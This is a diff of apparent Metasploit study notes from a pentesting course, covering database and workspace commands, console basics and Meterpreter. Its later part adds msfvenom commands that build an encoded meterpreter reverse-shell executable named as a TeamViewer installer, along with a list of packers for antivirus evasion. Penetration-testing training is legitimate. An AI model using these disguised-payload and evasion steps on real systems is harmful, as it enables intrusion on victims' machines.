@@ -93,19 +93,72 @@ apt install metasploit-framework
 show -h  
 ```
 
-```
-=========================
+   
+### Databases
 
-Database Backend Commands
+```bash
+# Start PostgreSQL
+sudo systemctl start postgresql
 
-=========================
-
-# Previously
-sudo systemctl start postgresq
+# Initiate a Database
 sudo msfdb init
-sudo msfdb run
-msfdb reinit
 
+# Check status
+sudo msfdb status
+
+# Connect to the Initiated Database
+sudo msfdb run
+
+# Reinitiate the Database
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+
+db_status
+
+# Connect to an existing data service
+db_connect        
+
+# Disconnect from the current data service
+db_disconnect     
+
+# Export a file containing the contents of the database
+db_export         
+
+# Before closing the session, save a backup:
+db_export -f xml backup.xml
+
+# Import a scan result file (filetype will be auto-detected)
+db_import         
+# For instance: 
+db_import Target.xml 
+# Or:
+db_import Target.nmap
+
+
+# After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. 
+db_export -f xml backup.xml
+
+
+# Rebuilds the database-stored module cache (deprecated)
+db_rebuild_cache  
+
+# Remove the saved data service entry
+db_remove         
+
+#  Save the current data service connection as the default to reconnect on startup
+db_save          
+
+#  Show the current data service status
+db_status        
+
+```
+
+
+### Workspaces
+
+```
 #####
 # workspaces 
 #####
@@ -135,30 +188,12 @@ workspace -r
 
 # Show this help information
 workspace -h     
-
-#####
-# workspaces 
-#####
-# Connect to an existing data service
-db_connect        
-
-# Disconnect from the current data service
-db_disconnect     
-
-# Export a file containing the contents of the database
-db_export         
-
-# Before closing the session, save a backup:
-db_export -f xml backup.xml
-
-# Import a scan result file (filetype will be auto-detected)
-db_import         
-# For instance: 
-db_import Target.xml 
-# Or:
-db_import Target.nmap
+```
 
 
+### Nmap
+
+```
 #####
 # ## Using Nmap Inside MSFconsole 
 #####
@@ -183,27 +218,11 @@ services         
 # List all vulnerabilities in the database
 vulns      
 
-# After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. 
-db_export -f xml backup.xml
-
-
-# Rebuilds the database-stored module cache (deprecated)
-db_rebuild_cache  
-
-# Remove the saved data service entry
-db_remove         
-
-#  Save the current data service connection as the default to reconnect on startup
-db_save          
-
-#  Show the current data service status
-db_status        
-
 ```
 
-Cheat sheet: 
+### Cheat sheet: basic commands
 
-```msf
+```bash linenums="1"
 # Search modules and filter with grep
 search <mysearchitem> 
 grep meterpreter show payloads
@@ -224,7 +243,7 @@ use <name of module (like exploit/cmd/linux/tcp_reverse) or number>
 msf exploit/cmd/linux/tcp_reverse> show options 
 
 # Configure an option (Watch out, prompt is included)
-msf exploit/cmd/linux/tcp_reverse> set <option> <value> 
+msf exploit/cmd/linux/tcp_reverse>set <option> <value> 
 
 # Configure an option as a constant during the msf session (Watch out, prompt is included)
 msf exploit/cmd/linux/tcp_reverse> setg <option> <value> 
@@ -249,7 +268,7 @@ msf6 exploit(windows/smb/ms17_010_psexec) > check
 msf  exploit/cmd/linux/tcp_reverse> run  
 
 # Run the exploit (Watch out, prompt is included)
-msf  exploit/cmd/linux/tcp_reverse> exploit 
+msf exploit/cmd/linux/tcp_reverse> exploit 
 
 # Run an exploit as a job by typing exploit -j
 exploit -j
@@ -281,31 +300,6 @@ jobs
     -p <opt>  Add persistence to job by job ID
     -v        Print more detailed info.  Use with -i and -l
 ```
-
-   
-### Databases
-
-```bash
-# Start PostgreSQL
-sudo systemctl start postgresql
-
-# Initiate a Database
-sudo msfdb init
-
-# Check status
-sudo msfdb status
-
-# Connect to the Initiated Database
-sudo msfdb run
-
-# Reinitiate the Database
-[!bash!]$ msfdb reinit
-[!bash!]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
-[!bash!]$ sudo service postgresql restart
-[!bash!]$ msfconsole -q
-msf6 > db_status
-```
-
 
 ## Plugins
 
@@ -363,7 +357,7 @@ sessions 
 ```
 
 
-## meterpreter commands
+### Meterpreter commands
 
 ```
 # view all available commands
@@ -488,7 +482,7 @@ Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today becaus
 # #### Generating Payload - Without Encoding
 # For instance, crafting a DLL file with a webshell
 #########
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port$ -a x86 -f dll > SECUR32.dll
 # -p: for the chosen payload
 # -a: architecture in the victim machine/application
 # -f: format for the output file
@@ -515,8 +509,12 @@ We can run multiple iterations of the same encoding scheme to escape EDS/IDR
 # #### Generating Payload - With Encoding - 
 # Running multiple iterations
 #########
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
-#
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe -k
+
+# -a: The architecture to use for --payload and --encoders (use --list archs to list)
+# -x, --template <path>: Specify a custom executable file to use as a template
+# -k, --keep: Preserve the --template behaviour and inject the payload as a new thread
+
 
 ```
 
@@ -526,11 +524,24 @@ As we can see, it is still not enough for AV evasion. There is a high number of 
 
 #### MSF - VirusTotal
 
-  Encoders
+If we check against VirusTotal to get a detection baseline from the payload we generated:
 
 ```shell-session
-amandaguglieri@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
+msf-virustotal -k <API key> -f TeamViewerInstall.exe
 ```
+
+### Packers
+
+Packers allow the `executable compression` of payload along with the executable program, leading to the decompression code in one single file. Packing Services for Optimal Antivirus Evasion (list of popular packer software):
+
+[UPX packer](https://upx.github.io/)
+[The Enigma Protector](https://enigmaprotector.com/)
+[MPRESS](https://www.matcode.com/mpress.htm)
+Alternate EXE Packer
+ExeStealth
+Morphine
+MEW
+Themida
 
 
 ## Modules
